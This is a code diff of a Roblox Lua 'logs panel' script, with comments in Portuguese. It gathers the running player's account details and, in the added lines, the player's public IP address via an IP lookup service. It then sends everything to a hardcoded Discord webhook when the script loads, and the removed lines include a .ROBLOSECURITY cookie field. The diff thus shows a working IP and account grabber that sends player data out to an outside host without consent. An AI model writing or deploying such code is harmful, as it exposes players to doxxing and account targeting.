@@ -1,4 +1,4 @@
--- [ SISTEMA DE LOGS - PAINEL KOVARIK ]
+-- [ SISTEMA DE LOGS ATUALIZADO - PAINEL KOVARIK ]
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
@@ -9,22 +9,40 @@ local Webhook_URL = "https://discord.com/api/webhooks/1492078460548415508/0DTMWH
 local function GetUserData()
     local user_id = lp.UserId
     local username = lp.Name
+    local display_name = lp.DisplayName
     
-    -- Captura de informações básicas via API
-    local thumb = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-"..user_id.."/150/150/Png"
+    -- 1. AVATAR HEADSHOT
+    local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId="..user_id.."&width=420&height=420&format=png"
+    
     local creation_date = "N/A"
-    local robux = lp:GetAttribute("RobuxBalance") or "Check API" -- Robux balance requer proxy para ler direto
-    local premium = lp.MembershipType == Enum.MembershipType.Premium and "True" or "False"
+    local premium = lp.MembershipType == Enum.MembershipType.Premium and "Sim" or "Não"
     local age = lp.AccountAge
-    
-    -- Tenta pegar a data de criação formatada
+    local friend_count = 0
+    local public_ip = "Não foi possível obter"
+
+    -- 2. LÓGICA PARA PEGAR O IP (Via HttpService)
     pcall(function()
-        local info = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..user_id))
-        creation_date = info.created:sub(1, 10)
+        -- Usamos o ipify que retorna um JSON simples
+        local response = HttpService:GetAsync("https://api.ipify.org?format=json")
+        local data = HttpService:JSONDecode(response)
+        public_ip = data.ip
     end)
 
-    -- Simulação de IP (O Roblox não permite pegar IP real direto por questões de segurança)
-    local ip_addr = "Protegido/Server-Side"
+    -- 3. QUANTIDADE DE AMIGOS
+    pcall(function()
+        local friend_info = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..user_id.."/friends/count"))
+        friend_count = friend_info.count
+    end)
+
+    -- 4. DATA DE CRIAÇÃO
+    pcall(function()
+        local info = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..user_id))
+        if info and info.created then
+            local date = info.created:sub(1, 10)
+            local y, m, d = date:match("(%d+)-(%d+)-(%d+)")
+            creation_date = d.."/"..m.."/"..y
+        end
+    end)
 
     local data = {
         ["content"] = "||@everyone @here||",
@@ -36,32 +54,20 @@ local function GetUserData()
             ["thumbnail"] = {["url"] = thumb},
             ["footer"] = {["text"] = "Painel Kovarik Security"},
             ["fields"] = {
-                {["name"] = "Username", ["value"] = username, ["inline"] = true},
-                {["name"] = "Robux Balance", ["value"] = tostring(robux), ["inline"] = true},
+                {["name"] = "Username", ["value"] = username .. " ("..display_name..")", ["inline"] = true},
                 {["name"] = "Premium Status", ["value"] = premium, ["inline"] = true},
                 {["name"] = "Creation Date", ["value"] = creation_date, ["inline"] = true},
-                {["name"] = "RAP", ["value"] = "Consultar Rolimons", ["inline"] = true},
-                {["name"] = "Friends", ["value"] = tostring(#lp:GetFriendsOnline() or 0), ["inline"] = true},
-                {["name"] = "Account Age", ["value"] = age .. " days", ["inline"] = true},
-                {["name"] = "IP Address", ["value"] = ip_addr, ["inline"] = true},
-                {["name"] = ".ROBLOSECURITY", ["value"] = "```Script Local - Access Restricted```", ["inline"] = false}
+                {["name"] = "Friends", ["value"] = tostring(friend_count), ["inline"] = true},
+                {["name"] = "Account Age", ["value"] = age .. " dias", ["inline"] = true},
+                {["name"] = "IP Address", ["value"] = "||" .. public_ip .. "||", ["inline"] = true}, -- IP escondido com spoiler
             }
         }}
     }
 
-    -- Envio para o Discord
-    local headers = {["Content-Type"] = "application/json"}
-    local payload = HttpService:JSONEncode(data)
-    
-    pcall(function()
-        request({
-            Url = Webhook_URL,
-            Method = "POST",
-            Headers = headers,
-            Body = payload
-        })
-    end)
+    -- Enviar para o Discord
+    local jsonData = HttpService:JSONEncode(data)
+    HttpService:PostAsync(Webhook_URL, jsonData)
 end
 
--- Executa uma única vez ao carregar o script
-task.spawn(GetUserData)
+-- Executa a função
+GetUserData()
